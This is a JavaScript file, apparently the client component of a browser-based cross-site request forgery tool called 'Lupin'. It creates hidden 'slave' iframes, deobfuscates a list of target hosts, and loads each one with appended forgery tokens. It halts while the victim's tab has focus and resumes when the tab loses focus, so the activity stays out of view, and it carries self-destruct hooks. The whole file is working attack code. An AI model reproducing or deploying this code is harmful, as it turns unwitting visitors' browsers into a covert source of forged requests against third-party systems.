
var targetsChecked	= 0;
var checkpoint		= 80;	
var numSlaves		= 10;
var targetIndex		= new Array(numSlaves);
var focusHalt		= false;
var sleepHalt       = false;
         
	 
function deobfuscate(string)
{
	var nums = string.split(".")
	var deobfs = "";
	var k;
           
	for (i=0; i<nums.length; i+=1)
	{
		k = parseInt(nums[i])-255;
        deobfs+=String.fromCharCode(k);
	}
	return deobfs;
}


function nextTarget(slaveFrameNum)
{

	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
	var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
	var src = targets[targetIndex[slaveFrameNum]];
 	
	if(focusHalt){ 
	    return;
	}
	
	targetIndex[slaveFrameNum] +=numSlaves;	
	if(targetsObfuscated){
		src = deobfuscate(src)
	}

	slaveFrame.setAttribute("src", "http://"+src+'?'+_LUPIN_TOKEN+_FORGERY);
}


function createSlaveFrame(slaveFrameNum)
{ 
	var slaveFrame = document.createElement("IFRAME"); 
	slaveFrame.setAttribute("height", "100");
	slaveFrame.setAttribute("width", "100");
	slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
	slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
	document.body.appendChild(slaveFrame); 
} 

/*
function isLupinDown()
{
	var slaveFrameName = "slaveFrame0";
	var slaveFrame = document.getElementsByName(slaveFrameName)[0]; 
	slaveFrame.setAttribute('src', document.location.hostname+'?'+_LUPIN_TOKEN+_FORGERY);
}
*/



function wakeSlaves()
{


	if(nibble == false)
	{
		if(focusHalt){ 
			return; 
		}
	}
	
    sleepHalt = false;
    
	/*
	if(isLupinDown())
	{
		initiateSelfDestruct()
		return;
	}
	*/
	
	for(var i=0; i<numSlaves;i++)
	{ 
		if(targetIndex[i] < targets.length){	
			nextTarget(i);
		}
	}	
}

           
function onMessage (event)
{
	var slaveFrameName = event.data;
	
	if(runWhileInFocus == false)
	{
	    if(slaveFrameName.indexOf("focus") != -1)
	    {
		    focusHalt = true;
		    return;
	    }
		
	    if(slaveFrameName.indexOf("blur") != -1)
	    {
		    focusHalt = false;
			if(sleepDuration < 10000){
				setTimeout("wakeSlaves()", 10000);
			}else{
				setTimeout("wakeSlaves()", sleepDuration);
			}
			
		    return;
	    }
	}
	

	targetsChecked += 1;

	if(targetsChecked == targets.length )
	{
		document.location.replace(document.location.hostname+"?"+_LUPIN_TOKEN+_DESTRUCT);      
		return;
	}

	var slaveFrameNum = parseInt(slaveFrameName.substring(10));

	if(focusHalt == true || targetIndex[slaveFrameNum] >= targets.length){
		return;
	}
	

	if(targetsChecked % checkpoint == 0)
	{
		sleepHalt = true;
		if(nibble == true){
		    nibble = false;
		}else{
		    setTimeout("wakeSlaves()", sleepDuration); 
	    }
	    
	}else{
	
	    if(sleepHalt == false){
		    nextTarget(slaveFrameNum);
	    }
	 }
	

}   	

/*
function initiateSelfDestruct(){
	window.parent.postMessage("selfDestruct",'*');
}
*/


function init()
{
    for(var i=0; i<numSlaves;i++)
    { 
    	targetIndex[i] = i; 
    	createSlaveFrame(i); 
    }
    
    if(runWhileInFocus == true || nibble == true){
        wakeSlaves();
    }
	
	window.addEventListener ("message", onMessage, false);
}




